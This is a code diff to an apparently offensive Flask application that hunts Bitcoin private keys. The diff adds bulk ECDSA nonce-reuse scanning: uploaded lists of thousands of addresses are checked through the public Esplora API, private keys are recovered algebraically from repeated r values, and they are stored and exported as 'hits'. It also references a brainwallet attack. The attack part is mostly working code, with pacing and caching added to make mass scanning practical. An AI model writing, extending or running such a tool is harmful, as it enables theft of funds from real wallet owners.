@@ -16,7 +16,7 @@ import os, sys, io, re, csv, gzip, json, math, time, signal, base64, hmac, html
 import sqlite3, threading, hashlib, struct, argparse
 from pathlib import Path
 from datetime import datetime, timezone
-from collections import defaultdict
+from collections import defaultdict, OrderedDict
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.request import urlopen, Request
 from urllib.parse import urljoin
@@ -108,6 +108,14 @@ DATASET_PREFER_BALANCE_TSV = os.environ.get(
     "DATASET_PREFER_BALANCE_TSV", "1").strip().lower() not in (
         "0", "false", "no", "off")
 ESPLORA    = os.environ.get("ESPLORA_URL", "https://blockstream.info/api")
+# Politeness limits for bulk nonce scans against public Esplora instances:
+# one request per ESPLORA_MIN_INTERVAL seconds, a bounded response cache and a
+# short retry/backoff on 429/5xx. Set the interval to 0 to disable pacing.
+ESPLORA_MIN_INTERVAL   = max(0.0, _env_float("ESPLORA_MIN_INTERVAL", 0.15))
+ESPLORA_MAX_RETRIES    = _env_int("ESPLORA_MAX_RETRIES", 2, 0)
+ESPLORA_CACHE_SIZE     = _env_int("ESPLORA_CACHE_SIZE", 4096, 0)
+NONCE_MAX_ADDRESSES    = _env_int("NONCE_MAX_ADDRESSES", 5000, 1)
+NONCE_MAX_UPLOAD_BYTES = _env_int("NONCE_MAX_UPLOAD_BYTES", 2_000_000, 1024)
 PORT       = int(os.environ.get("PORT", 5000))
 GENESIS_TS = 1293840000000  # 2011-01-01 ms
 CUTOFF_TS  = 1420070400000  # 2015-01-01 ms
@@ -851,10 +859,110 @@ def attack_brainwallet(passphrases, bf, log, job):
 # ════════════════════════════════════════════════════════════════════
 # ATTACK 3 — NONCE REUSE
 # ════════════════════════════════════════════════════════════════════
-def _esplora_get(path):
-    r = requests.get(f"{ESPLORA}{path}", timeout=25)
-    r.raise_for_status()
-    return r.text
+# ── Esplora access: pacing, bounded cache, bounded retries ──────────────
+_ESPLORA_LOCK = threading.Lock()
+_ESPLORA_LAST = [0.0]
+_ESPLORA_CACHE = OrderedDict()
+_ESPLORA_CACHE_LOCK = threading.Lock()
+
+def _esplora_cache_get(path):
+    if ESPLORA_CACHE_SIZE <= 0:
+        return None
+    with _ESPLORA_CACHE_LOCK:
+        if path not in _ESPLORA_CACHE:
+            return None
+        _ESPLORA_CACHE.move_to_end(path)
+        return _ESPLORA_CACHE[path]
+
+def _esplora_cache_put(path, text):
+    if ESPLORA_CACHE_SIZE <= 0:
+        return
+    with _ESPLORA_CACHE_LOCK:
+        _ESPLORA_CACHE[path] = text
+        _ESPLORA_CACHE.move_to_end(path)
+        while len(_ESPLORA_CACHE) > ESPLORA_CACHE_SIZE:
+            _ESPLORA_CACHE.popitem(last=False)
+
+def _esplora_pace():
+    if ESPLORA_MIN_INTERVAL <= 0:
+        return
+    with _ESPLORA_LOCK:
+        wait = _ESPLORA_LAST[0] + ESPLORA_MIN_INTERVAL - time.monotonic()
+        if wait > 0:
+            time.sleep(wait)
+        _ESPLORA_LAST[0] = time.monotonic()
+
+def _esplora_get(path, should_stop=None):
+    """GET one Esplora path, with caching, pacing, retries and stop checks."""
+    hit = _esplora_cache_get(path)
+    if hit is not None:
+        return hit
+    last_err = None
+    for attempt in range(ESPLORA_MAX_RETRIES + 1):
+        if should_stop and should_stop():
+            raise RuntimeError("stopped by user")
+        if attempt:
+            time.sleep(min(2 ** (attempt - 1), 4))
+        _esplora_pace()
+        try:
+            r = requests.get(f"{ESPLORA}{path}", timeout=25)
+            if r.status_code == 429 or r.status_code >= 500:
+                raise RuntimeError(f"HTTP {r.status_code}")
+            r.raise_for_status()
+            text = r.text
+        except Exception as e:
+            last_err = e
+            continue
+        _esplora_cache_put(path, text)
+        return text
+    raise RuntimeError(
+        f"Esplora request failed after {ESPLORA_MAX_RETRIES + 1} attempt(s): {last_err}")
+
+_ADDR_B58 = re.compile(r"^[13][1-9A-HJ-NP-Za-km-z]{24,34}$")
+# bech32 data charset: 0, 2-9 and letters except 1, b, i, o.
+_ADDR_BECH32 = re.compile(r"^bc1[02-9ac-hj-np-z]{11,71}$")
+
+def _normalise_address(addr):
+    """Trim and lowercase an all-uppercase bech32 address."""
+    a = (addr or "").strip()
+    if a.upper() == a and a.lower().startswith("bc1"):
+        a = a.lower()
+    return a
+
+def _valid_address(addr):
+    """Loose syntax check for mainnet Base58Check and bech32/bech32m addresses.
+
+    The old [1-9A-HJ-NP-Za-km-z]{2,90} regex rejected many valid bc1
+    addresses because the bech32 charset contains 0 but not 1, b, i or o.
+    Checksum verification is left to the API/parser.
+    """
+    a = _normalise_address(addr)
+    return bool(_ADDR_B58.fullmatch(a) or _ADDR_BECH32.fullmatch(a))
+
+def _parse_address_lines(data):
+    """Return (unique_addresses, skipped_lines, duplicate_lines).
+
+    Accepts one address per line, or a CSV/TSV whose first column is the
+    address. Blank lines and # comments are ignored; anything after the
+    first column (balance, label, ...) is ignored.
+    """
+    addresses, seen = [], set()
+    skipped = duplicates = 0
+    for raw in (data or "").splitlines():
+        line = raw.replace("\ufeff", "").strip()
+        if not line or line.startswith("#"):
+            continue
+        token = re.split(r"[\s,;|\t]+", line, maxsplit=1)[0].strip().strip("\"'")
+        token = _normalise_address(token)
+        if not _valid_address(token):
+            skipped += 1
+            continue
+        if token in seen:
+            duplicates += 1
+            continue
+        seen.add(token)
+        addresses.append(token)
+    return addresses, skipped, duplicates
 
 def _parse_der_sig(sig):
     """Return (r, s, sighash_type) or None."""
@@ -920,25 +1028,30 @@ def _legacy_sighash(raw_tx, input_idx, prevout_script, htype=1):
     except Exception:
         return None
 
-def _fetch_sigs_for_address(addr, log):
+def _fetch_sigs_for_address(addr, log, should_stop=None):
     """Fetch all (r,s,z) signatures for an address via Esplora."""
     sigs = []
     try:
-        txt = _esplora_get(f"/address/{addr}/txs")
+        txt = _esplora_get(f"/address/{addr}/txs", should_stop)
         txs = json.loads(txt)
     except Exception as e:
         log(f"[nonce] address fetch failed: {e}")
         return sigs
     log(f"[nonce] {len(txs)} transactions for {addr}")
     for tx in txs:
+        if should_stop and should_stop():
+            log("[nonce] stopped")
+            break
         txid = tx.get('txid')
         try:
-            raw = bytes.fromhex(_esplora_get(f"/tx/{txid}/hex"))
+            raw = bytes.fromhex(_esplora_get(f"/tx/{txid}/hex", should_stop))
         except Exception:
             continue
         # try legacy first
         vin = tx.get('vin', [])
         for idx, inp in enumerate(vin):
+            if should_stop and should_stop():
+                break
             script_sig_hex = inp.get('scriptsig', '')
             if not script_sig_hex: continue
             sig_bytes = bytes.fromhex(script_sig_hex)
@@ -957,20 +1070,26 @@ def _fetch_sigs_for_address(addr, log):
                          "input": idx, "type": "legacy"})
     return sigs
 
-def attack_nonce_reuse(address, log, job):
-    """Fetch sigs, group by r, recover key algebraically."""
-    log(f"[nonce] target {address}")
-    sigs = _fetch_sigs_for_address(address, log)
+def attack_nonce_reuse(address, log, job, should_stop=None, prefix=""):
+    """Fetch sigs, group by r, recover key algebraically.
+
+    `should_stop` lets a bulk scan abort mid-request; `prefix` tags log lines
+    with the position in that scan. A single-address call behaves as before.
+    """
+    stop = should_stop or (lambda: job.get("stop", False))
+    log(f"{prefix}[nonce] target {address}")
+    sigs = _fetch_sigs_for_address(address, log, stop)
     if not sigs:
-        log("[nonce] no signatures extracted")
+        log(f"{prefix}[nonce] no signatures extracted")
         return []
     by_r = defaultdict(list)
     for sg in sigs:
         by_r[sg['r']].append(sg)
     dupes = {r: v for r, v in by_r.items() if len(v) > 1}
-    log(f"[nonce] {len(dupes)} reused-r groups")
+    log(f"{prefix}[nonce] {len(dupes)} reused-r groups")
     hits = []
     for r, group in dupes.items():
+        if stop(): break
         for a in range(len(group)):
             for b in range(a + 1, len(group)):
                 s1, z1 = group[a]['s'], group[a]['z']
@@ -982,15 +1101,62 @@ def attack_nonce_reuse(address, log, job):
                     d = ((s1 * k - z1) * pow(r, -1, N)) % N
                 except Exception:
                     continue
-                for label, addr in derive_addresses(d):
+                derived = derive_addresses(d)
+                # A recovered key that does not reproduce the target is almost
+                # always a bad sighash parse, not a recovery. Log it, but do
+                # not call it a hit and do not flood /results.
+                if not any(addr == address for _, addr in derived):
+                    log(f"{prefix}[nonce] recovered key does not match target "
+                        f"(possible bad sighash) — not saved")
+                    continue
+                for label, addr in derived:
                     hit = {"address": address, "privkey": hex(d),
                            "recovered_addr": addr, "type": label,
+                           "matches_target": addr == address,
                            "r": hex(r), "txids": [group[a]['txid'], group[b]['txid']],
                            "found_at": datetime.now(timezone.utc).isoformat()}
                     hits.append(hit); _save_result("nonce", hit)
-                    log(f"  ★★★ KEY {hex(d)}  {addr}")
-    log(f"[nonce] done — {len(hits)} hits")
+                    log(f"{prefix}  ★★★ KEY {hex(d)}  {addr}")
+    log(f"{prefix}[nonce] done — {len(hits)} hits")
     return hits
+
+
+def attack_nonce_reuse_bulk(addresses, log, job):
+    """Scan a list of addresses for ECDSA nonce reuse, with progress + Stop."""
+    total = len(addresses)
+    log(f"[nonce] bulk scan: {total:,} address(es)")
+    if not total:
+        job["detail"] = "no addresses"
+        return []
+    t0 = time.time()
+    all_hits = []
+    for i, addr in enumerate(addresses):
+        if job["stop"]:
+            log("[nonce] stopped by user")
+            break
+        prefix = f"[{i+1:,}/{total:,}] "
+        try:
+            all_hits.extend(attack_nonce_reuse(
+                addr, log, job, should_stop=lambda: job["stop"], prefix=prefix))
+        except RuntimeError as e:
+            if "stopped by user" in str(e):
+                log("[nonce] stopped by user")
+                break
+            log(f"{prefix}[!] {e}")
+        except Exception as e:
+            # One bad address must not abort a multi-thousand-address scan.
+            log(f"{prefix}[!] {e}")
+            continue
+        done = i + 1
+        elapsed = max(time.time() - t0, 0.001)
+        rate = done / elapsed
+        eta = (total - done) / max(rate, 0.001)
+        job["progress"] = done / total
+        job["detail"] = (f"{done:,}/{total:,} addresses  "
+                         f"hits={len(all_hits):,}  {rate:.2f} addr/s  "
+                         f"eta ~{eta/60:.1f} min")
+    log(f"[nonce] bulk done — {len(all_hits):,} hits over {total:,} addresses")
+    return all_hits
 
 
 # ════════════════════════════════════════════════════════════════════
@@ -1233,7 +1399,8 @@ weak ones.</p>
 <a class="btn" href="/brain">Open</a></div>
 <div class="card"><h2>3. Nonce Reuse</h2>
 <p class="muted">Two ECDSA signatures sharing r ⇒ recover k and d
-algebraically. Fetches signatures via Blockstream Esplora.</p>
+algebraically. Scan one address or upload a .txt list of thousands via
+Blockstream Esplora; hits are stored in SQLite.</p>
 <a class="btn" href="/nonce">Open</a></div>
 </div>"""
     return page(body)
@@ -1426,22 +1593,49 @@ def api_brain():
 @app.route("/nonce")
 def nonce_page():
     body = """
-<div class="card"><h2>Nonce reuse — target address</h2>
+<div class="card"><h2>Nonce reuse — single address</h2>
 <label>Bitcoin address</label>
 <input id="a" placeholder="1... or bc1...">
-<button class="btn" onclick="start()">Scan</button>
-<button class="btn danger" onclick="stop('nonce')">Stop</button>
+<button class="btn" onclick="scanOne()">Scan</button>
 <p class="muted">Fetches all txs via Blockstream Esplora, finds
 repeated r values, recovers the private key.</p>
 </div>
+<div class="card"><h2>Nonce reuse — bulk upload</h2>
+<label>Upload .txt (one address per line; CSV/TSV first column is OK)</label>
+<input type="file" id="f" accept=".txt,.csv">
+<button class="btn" onclick="scanFile()">Scan file</button>
+<button class="btn danger" onclick="stop('nonce')">Stop</button>
+<p id="count" class="muted"></p>
+<p class="muted">Blank lines, # comments, duplicate lines and everything after
+the first column are ignored; invalid lines are counted in the status message.
+Both legacy 1.../3... and bech32 bc1... addresses are accepted. Requests are
+paced (default 0.15 s each) and cached, so a few thousand addresses against
+the public API takes minutes, not seconds. Only legacy P2PKH spends are parsed
+— segwit witness signatures are not supported yet. A recovered key that does
+not reproduce the target address is logged but not saved. Hits appear on
+/results.</p>
+</div>
 <div class="card"><h2>Progress</h2>
+<div class="bar"><div id="bar" style="width:0%"></div></div>
 <p id="detail" class="muted"></p><pre id="log"></pre>
 </div>
 <script>
-function start(){
+function scanOne(){
   const a=document.getElementById('a').value.trim();
   post('/api/nonce',{address:a});
 }
+function scanFile(){
+  const file=document.getElementById('f').files[0];
+  if(!file){alert('pick a .txt file');return}
+  const reader=new FileReader();
+  reader.onload=()=>{ post('/api/nonce/bulk',{data:reader.result}); };
+  reader.readAsText(file);
+}
+document.getElementById('f').addEventListener('change',function(){
+  const file=this.files[0], out=document.getElementById('count');
+  if(!file){out.textContent='';return}
+  out.textContent='selected '+file.name+' ('+file.size.toLocaleString()+' bytes)';
+});
 watch('nonce');
 </script>"""
     return page(body)
@@ -1449,17 +1643,52 @@ watch('nonce');
 @app.route("/api/nonce", methods=["POST"])
 def api_nonce():
     j = request.get_json(silent=True) or {}
-    addr = (j.get("address") or "").strip()
+    addr = _normalise_address(j.get("address"))
     if not addr: return {"ok": False, "msg": "enter a Bitcoin address first"}
-    if not re.fullmatch(r"[1-9A-HJ-NP-Za-km-z]{2,90}", addr):
-        return {"ok": False, "msg": "that does not look like a Bitcoin address"}
+    if not _valid_address(addr):
+        return {"ok": False, "msg": "that does not look like a mainnet Bitcoin address"}
     ok, msg = _start_job("nonce", attack_nonce_reuse, addr)
+    return {"ok": ok, "msg": msg}
+
+@app.route("/api/nonce/bulk", methods=["POST"])
+def api_nonce_bulk():
+    """Start a bulk nonce-reuse scan from an uploaded text/CSV file."""
+    j = request.get_json(silent=True) or {}
+    data = j.get("data")
+    if data is None:
+        raw = j.get("addresses")
+        data = "\n".join(str(x) for x in raw) if isinstance(raw, list) else ""
+    if not isinstance(data, str):
+        return {"ok": False, "msg": "upload a .txt file (or send an addresses array)"}
+    if len(data.encode("utf-8", "ignore")) > NONCE_MAX_UPLOAD_BYTES:
+        return {"ok": False,
+                "msg": f"file too large (max {NONCE_MAX_UPLOAD_BYTES:,} bytes)"}
+    addresses, skipped, duplicates = _parse_address_lines(data)
+    if not addresses:
+        return {"ok": False, "msg": "no valid Bitcoin addresses found in the file"}
+    if len(addresses) > NONCE_MAX_ADDRESSES:
+        return {"ok": False,
+                "msg": (f"{len(addresses):,} addresses exceeds the "
+                        f"NONCE_MAX_ADDRESSES={NONCE_MAX_ADDRESSES:,} cap — "
+                        "split the file or raise the cap")}
+    ok, msg = _start_job("nonce", attack_nonce_reuse_bulk, addresses)
+    if ok:
+        extras = []
+        if skipped: extras.append(f"{skipped:,} invalid line(s) skipped")
+        if duplicates: extras.append(f"{duplicates:,} duplicate(s) skipped")
+        msg = (f"started {len(addresses):,} addresses"
+               + (f" ({', '.join(extras)})" if extras else ""))
     return {"ok": ok, "msg": msg}
 
 @app.route("/results")
 def results_page():
     rows = _list_results()
     body = "<div class='card'><h2>Results</h2>"
+    body += ("<p><a class='btn' href='/api/results/export'>Download all (JSONL)</a>"
+             "<a class='btn' href='/api/results/export?attack=nonce'>"
+             "Download nonce results (JSONL)</a></p>"
+             "<p class='muted'>The page shows the newest 500 hits; "
+             "the downloads contain all of them.</p>")
     if not rows:
         body += "<p class='muted'>no hits yet</p>"
     for r in rows:
@@ -1470,6 +1699,34 @@ def results_page():
                  f"<pre>{html.escape(json.dumps(r['payload'], indent=2))}</pre></div>")
     body += "</div>"
     return page(body)
+
+@app.route("/api/results/export")
+def api_results_export():
+    """All hits as newline-delimited JSON (the page shows only 500)."""
+    attack = (request.args.get("attack") or "").strip()
+    q = "SELECT attack,payload,ts FROM results"
+    args = ()
+    if attack:
+        q += " WHERE attack = ?"
+        args = (attack,)
+    q += " ORDER BY id ASC"
+    with _db() as c:
+        rows = list(c.execute(q, args))
+    lines = []
+    for a, p, ts in rows:
+        try:
+            item = json.loads(p)
+        except Exception:
+            item = {"payload_raw": p}
+        item["attack"] = a
+        item["saved_at"] = ts
+        lines.append(json.dumps(item))
+    slug = re.sub(r"[^A-Za-z0-9_-]", "", attack) or "all"
+    filename = f"btc-hunt-{slug}-results.jsonl"
+    return Response("\n".join(lines) + ("\n" if lines else ""),
+                    mimetype="application/x-ndjson",
+                    headers={"Content-Disposition": f'attachment; filename="{filename}"',
+                             "Cache-Control": "no-store, max-age=0"})
 
 @app.route("/api/job/<name>")
 def api_job_status(name):
